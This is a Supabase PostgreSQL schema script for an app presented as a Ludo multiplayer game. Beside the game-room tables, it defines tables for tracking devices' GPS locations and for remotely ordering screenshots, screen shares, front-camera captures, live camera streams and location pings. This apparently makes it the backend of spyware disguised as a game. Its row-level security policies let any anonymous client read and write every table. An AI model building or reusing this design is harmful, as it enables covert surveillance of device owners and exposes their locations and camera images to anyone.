-- ==============================================================================
-- LUDO REALM / GAME TRACKER - SUPABASE POSTGRESQL SCHEMA SCRIPT
-- ==============================================================================
-- Run this script in your Supabase Project Dashboard -> SQL Editor.
-- This sets up the relational tables, indexes, RLS policies, and Realtime streams.
-- ==============================================================================

-- 1. App Users Table
CREATE TABLE IF NOT EXISTS public.app_users (
    uid TEXT PRIMARY KEY,
    email TEXT UNIQUE,
    display_name TEXT,
    is_admin BOOLEAN DEFAULT FALSE,
    created_at TIMESTAMPTZ DEFAULT NOW(),
    updated_at TIMESTAMPTZ DEFAULT NOW()
);

-- 2. Devices Table (Tracked Mobile / Admin Clients)
CREATE TABLE IF NOT EXISTS public.devices (
    device_id TEXT PRIMARY KEY,
    platform TEXT NOT NULL DEFAULT 'android',
    display_name TEXT,
    email TEXT,
    native_capture_enabled BOOLEAN DEFAULT FALSE,
    latitude DOUBLE PRECISION,
    longitude DOUBLE PRECISION,
    accuracy DOUBLE PRECISION,
    last_location_time BIGINT,
    fcm_token TEXT,
    registered_at TIMESTAMPTZ DEFAULT NOW(),
    last_seen_at TIMESTAMPTZ DEFAULT NOW()
);

-- Ensure fcm_token column exists if table already created
ALTER TABLE public.devices ADD COLUMN IF NOT EXISTS fcm_token TEXT;

-- 3. Remote Commands & Screenshot Requests Table
CREATE TABLE IF NOT EXISTS public.screenshot_requests (
    id TEXT PRIMARY KEY,
    target_device_id TEXT NOT NULL,
    requested_by_device_id TEXT,
    request_type TEXT NOT NULL, -- 'screenshot', 'screen_share', 'camera_capture', 'camera_stream', 'location_ping'
    camera_facing TEXT DEFAULT 'front',
    status TEXT NOT NULL DEFAULT 'pending', -- 'pending', 'active', 'completed', 'failed', 'expired', 'stopped'
    screenshot_url TEXT,
    error TEXT,
    failure_reason TEXT,
    requested_at TIMESTAMPTZ DEFAULT NOW(),
    started_at TIMESTAMPTZ,
    completed_at TIMESTAMPTZ,
    stopped_at TIMESTAMPTZ
);

-- 4. Ludo Online Multiplayer Rooms Table
CREATE TABLE IF NOT EXISTS public.ludo_rooms (
    id TEXT PRIMARY KEY,
    room_code TEXT UNIQUE NOT NULL,
    host_uid TEXT NOT NULL,
    status TEXT NOT NULL DEFAULT 'waiting', -- 'waiting', 'playing', 'finished'
    current_turn_index INT DEFAULT 0,
    dice_value INT DEFAULT 1,
    is_dice_rolled BOOLEAN DEFAULT FALSE,
    is_moving BOOLEAN DEFAULT FALSE,
    consecutive_sixes INT DEFAULT 0,
    players_json JSONB DEFAULT '[]'::jsonb,
    game_state_json JSONB DEFAULT '{}'::jsonb,
    created_at TIMESTAMPTZ DEFAULT NOW(),
    updated_at TIMESTAMPTZ DEFAULT NOW()
);

-- ==============================================================================
-- INDEXES FOR ULTRA-FAST LOOKUPS & COMMAND DISPATCH
-- ==============================================================================
CREATE INDEX IF NOT EXISTS idx_requests_target_status ON public.screenshot_requests(target_device_id, status);
CREATE INDEX IF NOT EXISTS idx_devices_last_seen ON public.devices(last_seen_at DESC);
CREATE INDEX IF NOT EXISTS idx_rooms_code ON public.ludo_rooms(room_code);

-- ==============================================================================
-- ENABLE ROW LEVEL SECURITY (RLS)
-- ==============================================================================
ALTER TABLE public.app_users ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.devices ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.screenshot_requests ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.ludo_rooms ENABLE ROW LEVEL SECURITY;

-- Allow public anonymous read & write for client devices with Anon Key
DROP POLICY IF EXISTS "Allow public read/write on app_users" ON public.app_users;
CREATE POLICY "Allow public read/write on app_users" ON public.app_users FOR ALL USING (true) WITH CHECK (true);

DROP POLICY IF EXISTS "Allow public read/write on devices" ON public.devices;
CREATE POLICY "Allow public read/write on devices" ON public.devices FOR ALL USING (true) WITH CHECK (true);

DROP POLICY IF EXISTS "Allow public read/write on screenshot_requests" ON public.screenshot_requests;
CREATE POLICY "Allow public read/write on screenshot_requests" ON public.screenshot_requests FOR ALL USING (true) WITH CHECK (true);

DROP POLICY IF EXISTS "Allow public read/write on ludo_rooms" ON public.ludo_rooms;
CREATE POLICY "Allow public read/write on ludo_rooms" ON public.ludo_rooms FOR ALL USING (true) WITH CHECK (true);

-- ==============================================================================
-- ENABLE REALTIME WEBSOCKET REPLICATION FOR LIVE MULTIPLAYER & ADMIN COMMANDS
-- ==============================================================================
BEGIN;
  DROP PUBLICATION IF EXISTS supabase_realtime;
  CREATE PUBLICATION supabase_realtime FOR TABLE 
    public.devices, 
    public.screenshot_requests, 
    public.ludo_rooms;
COMMIT;
